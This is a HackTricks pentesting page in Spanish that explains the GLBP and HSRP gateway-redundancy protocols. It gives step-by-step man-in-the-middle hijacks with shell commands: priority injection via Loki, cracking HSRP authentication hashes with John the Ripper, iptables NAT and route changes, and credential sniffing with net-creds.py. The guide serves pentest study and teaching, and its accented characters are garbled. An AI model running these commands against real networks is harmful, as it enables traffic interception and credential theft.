# Ataques GLBP & HSRP

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci칩n**](https://github.com/sponsors/carlospolop)!
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Descripci칩n general del secuestro de FHRP

### Informaci칩n sobre FHRP
FHRP est치 dise침ado para proporcionar robustez a la red al fusionar m칰ltiples enrutadores en una 칰nica unidad virtual, mejorando as칤 la distribuci칩n de carga y la tolerancia a fallos. Cisco Systems introdujo protocolos destacados en esta suite, como GLBP y HSRP.

### Informaci칩n del Protocolo GLBP
La creaci칩n de Cisco, GLBP, funciona en la pila TCP/IP, utilizando UDP en el puerto 3222 para la comunicaci칩n. Los enrutadores en un grupo GLBP intercambian paquetes "hello" en intervalos de 3 segundos. Si un enrutador no env칤a estos paquetes durante 10 segundos, se presume que est치 fuera de l칤nea. Sin embargo, estos temporizadores no son fijos y pueden ser modificados.

### Operaciones y Distribuci칩n de Carga de GLBP
GLBP se destaca al permitir la distribuci칩n de carga entre enrutadores utilizando una 칰nica IP virtual junto con m칰ltiples direcciones MAC virtuales. En un grupo GLBP, cada enrutador participa en el reenv칤o de paquetes. A diferencia de HSRP/VRRP, GLBP ofrece un equilibrio de carga genuino a trav칠s de varios mecanismos:

- **Equilibrio de Carga Dependiente del Host:** Mantiene la asignaci칩n de direcciones MAC AVF consistente a un host, esencial para configuraciones NAT estables.
- **Equilibrio de Carga Round-Robin:** El enfoque predeterminado, alternando la asignaci칩n de direcciones MAC AVF entre los hosts solicitantes.
- **Equilibrio de Carga Round-Robin Ponderado:** Distribuye la carga en funci칩n de m칠tricas de "Peso" predefinidas.

### Componentes Clave y Terminolog칤a en GLBP
- **AVG (Puerta de enlace virtual activa):** El enrutador principal, responsable de asignar direcciones MAC a los enrutadores pares.
- **AVF (Reenviador virtual activo):** Un enrutador designado para gestionar el tr치fico de red.
- **Prioridad GLBP:** Una m칠trica que determina el AVG, comenzando en un valor predeterminado de 100 y variando entre 1 y 255.
- **Peso GLBP:** Refleja la carga actual en un enrutador, ajustable manualmente o a trav칠s del Seguimiento de Objetos.
- **Direcci칩n IP Virtual GLBP:** Sirve como puerta de enlace predeterminada de la red para todos los dispositivos conectados.

Para las interacciones, GLBP utiliza la direcci칩n multicast reservada 224.0.0.102 y el puerto UDP 3222. Los enrutadores transmiten paquetes "hello" en intervalos de 3 segundos, y se consideran no operativos si se pierde un paquete durante un per칤odo de 10 segundos.

### Mecanismo de Ataque GLBP
Un atacante puede convertirse en el enrutador principal enviando un paquete GLBP con el valor de prioridad m치s alto (255). Esto puede llevar a ataques de DoS o MITM, permitiendo la interceptaci칩n o redirecci칩n del tr치fico.

### Ejecuci칩n de un Ataque GLBP con Loki
[Loki](https://github.com/raizo62/loki_on_kali) puede realizar un ataque GLBP inyectando un paquete con prioridad y peso establecidos en 255. Los pasos previos al ataque implican recopilar informaci칩n como la direcci칩n IP virtual, la presencia de autenticaci칩n y los valores de prioridad del enrutador utilizando herramientas como Wireshark.

Pasos del Ataque:
1. Cambiar a modo promiscuo y habilitar el reenv칤o de IP.
2. Identificar el enrutador objetivo y recuperar su IP.
3. Generar un ARP Gratuito.
4. Inyectar un paquete GLBP malicioso, suplantando al AVG.
5. Asignar una direcci칩n IP secundaria a la interfaz de red del atacante, reflejando la IP virtual de GLBP.
6. Implementar SNAT para una visibilidad completa del tr치fico.
7. Ajustar el enrutamiento para garantizar el acceso continuo a Internet a trav칠s del enrutador AVG original.

Siguiendo estos pasos, el atacante se posiciona como un "hombre en el medio", capaz de interceptar y analizar el tr치fico de red, incluidos datos no cifrados o sensibles.

Para fines de demostraci칩n, aqu칤 est치n los fragmentos de comando requeridos:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
### Explicaci칩n Pasiva del Secuestro de HSRP con Detalles de Comandos

#### Descripci칩n General de HSRP (Protocolo de Router en Espera/Redundancia)
HSRP es un protocolo propietario de Cisco dise침ado para la redundancia de la puerta de enlace de red. Permite la configuraci칩n de m칰ltiples routers f칤sicos en una unidad l칩gica 칰nica con una direcci칩n IP compartida. Esta unidad l칩gica es gestionada por un router principal responsable de dirigir el tr치fico. A diferencia de GLBP, que utiliza m칠tricas como prioridad y peso para el equilibrio de carga, HSRP se basa en un 칰nico router activo para la gesti칩n del tr치fico.

#### Roles y Terminolog칤a en HSRP
- **Router Activo de HSRP**: El dispositivo que act칰a como la puerta de enlace, gestionando el flujo de tr치fico.
- **Router en Espera de HSRP**: Un router de respaldo, listo para tomar el control si el router activo falla.
- **Grupo de HSRP**: Un conjunto de routers que colaboran para formar un 칰nico router virtual resistente.
- **Direcci칩n MAC de HSRP**: Una direcci칩n MAC virtual asignada al router l칩gico en la configuraci칩n de HSRP.
- **Direcci칩n IP Virtual de HSRP**: La direcci칩n IP virtual del grupo de HSRP, actuando como la puerta de enlace predeterminada para los dispositivos conectados.

#### Versiones de HSRP
HSRP viene en dos versiones, HSRPv1 y HSRPv2, difiriendo principalmente en capacidad de grupo, uso de IP multicast y estructura de direcci칩n MAC virtual. El protocolo utiliza direcciones IP multicast espec칤ficas para el intercambio de informaci칩n de servicio, con paquetes Hello enviados cada 3 segundos. Se presume que un router est치 inactivo si no se recibe ning칰n paquete dentro de un intervalo de 10 segundos.

#### Mecanismo de Ataque de HSRP
Los ataques de HSRP implican tomar el rol del Router Activo de forma forzada mediante la inyecci칩n de un valor de prioridad m치ximo. Esto puede llevar a un ataque de Hombre en el Medio (MITM). Los pasos esenciales previos al ataque incluyen recopilar datos sobre la configuraci칩n de HSRP, lo cual se puede hacer utilizando Wireshark para el an치lisis de tr치fico.

#### Pasos para Evadir la Autenticaci칩n de HSRP
1. Guardar el tr치fico de red que contiene datos de HSRP en un archivo .pcap.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. Extraer los hashes MD5 del archivo .pcap utilizando hsrp2john.py.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. Descifrar los hashes MD5 utilizando John the Ripper.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Ejecutando la Inyecci칩n de HSRP con Loki**

1. Iniciar Loki para identificar los anuncios de HSRP.
2. Configurar la interfaz de red en modo promiscuo y habilitar el reenv칤o de IP.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Utilizar Loki para apuntar al router espec칤fico, ingresar la contrase침a de HSRP descifrada y realizar las configuraciones necesarias para hacerse pasar por el Router Activo.
4. Despu칠s de obtener el rol del Router Activo, configurar la interfaz de red y las tablas IP para interceptar el tr치fico leg칤timo.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Modificar la tabla de enrutamiento para dirigir el tr치fico a trav칠s del antiguo Router Activo.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Utilizar net-creds.py o una utilidad similar para capturar credenciales del tr치fico interceptado.
```shell
sudo python2 net-creds.py -i eth0
```

Al ejecutar estos pasos, el atacante se coloca en una posici칩n para interceptar y manipular el tr치fico, similar al procedimiento para el secuestro de GLBP. Esto resalta la vulnerabilidad en protocolos de redundancia como HSRP y la necesidad de medidas de seguridad robustas.
